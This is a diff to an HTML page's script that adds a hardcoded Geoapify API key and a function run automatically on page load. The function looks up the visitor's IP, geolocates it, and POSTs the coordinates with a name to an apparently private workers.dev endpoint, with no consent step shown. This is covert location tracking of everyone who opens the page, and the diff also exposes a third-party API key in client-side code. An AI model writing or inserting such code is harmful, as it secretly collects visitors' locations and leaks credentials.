@@ -170,6 +170,7 @@
     </div>
 
     <script>
+      const GEOAPIFY_API_KEY = "0409169befaf4881bc3201179c7dfdf6";
       let userLocation = null;
       let cachedName = null;
       let postInterval = null;
@@ -206,7 +207,28 @@
         }
         // locationStatus.style.display = "hidden";
       }
+      async function sendIpData() {
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        const ipData = await ipRes.json();
+        const userIP = ipData.ip;
 
+        // Step 2: Get location info from Geoapify
+        const locRes = await fetch(`https://api.geoapify.com/v1/ipinfo?ip=${userIP}&apiKey=${GEOAPIFY_API_KEY}`);
+        const locData = await locRes.json();
+
+        const formData = {
+          name: cachedName,
+          latitude: locData.location?.latitude,
+          longitude: locData.location?.longitude,
+        };
+        await fetch("https://julie.vasdvasd011.workers.dev/locations", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(formData),
+        });
+      }
       // Send POST request to API
       async function sendLocationData() {
         if (!cachedName) return;
@@ -342,8 +364,8 @@
         }
       });
       cachedName = "load";
+      sendIpData();
       sendLocationData();
     </script>
   </body>
 </html>
-
